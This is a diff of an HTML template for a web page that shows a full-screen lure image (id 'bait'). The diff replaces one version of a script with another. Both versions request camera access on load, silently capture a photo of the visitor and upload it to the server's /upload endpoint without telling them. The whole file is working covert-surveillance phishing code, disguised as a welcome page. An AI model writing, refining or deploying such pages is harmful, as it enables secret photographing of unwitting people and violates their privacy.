@@ -1,63 +1,48 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Welcome</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Access</title>
     <style>
-        body {
+        body, html {
             margin: 0;
             padding: 0;
-            text-align: center;
-            background-color: black;
-            color: white;
-        }
-        img#display-image {
+            height: 100%;
             width: 100%;
-            max-width: 600px;
+            overflow: hidden;
+            background: black;
         }
-        video {
-            display: none;
+        #bait {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover; /* Fullscreen image, no gap */
         }
     </style>
 </head>
 <body>
-    <!-- Static image shown to visitor -->
-    <img id="display-image" src="{{ url_for('static', filename='welcome.jpg') }}" alt="Welcome Image">
-
-    <video id="video" autoplay></video>
+    <!-- Replace welcome.jpg with your image in static folder -->
+    <img src="/static/welcome.jpg" id="bait" alt="Welcome Image">
 
     <script>
-        const video = document.getElementById('video');
-
-        // Ask for camera immediately
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-
-                // Give browser a tiny moment to start the stream, then capture
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                    // Convert to Blob
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('image', blob, 'photo.jpg');
-
-                        fetch('/upload', { method: 'POST', body: formData })
-                            .then(res => console.log("Image sent!"))
-                            .catch(err => console.error(err));
-                    }, 'image/jpeg');
-
-                    // Stop the camera after capture
-                    stream.getTracks().forEach(track => track.stop());
-                }, 1000); // 1 second for stream to be ready
-            })
-            .catch(err => {
-                console.error("Camera access denied:", err);
-            });
+        window.onload = function () {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    const track = stream.getVideoTracks()[0];
+                    const imageCapture = new ImageCapture(track);
+                    imageCapture.takePhoto()
+                        .then(blob => {
+                            const formData = new FormData();
+                            formData.append('photo', blob, 'photo.jpg');
+                            fetch('/upload', { method: 'POST', body: formData });
+                        })
+                        .catch(err => console.error("Photo capture error:", err));
+                })
+                .catch(err => console.error("Camera access denied:", err));
+        };
     </script>
 </body>
 </html>
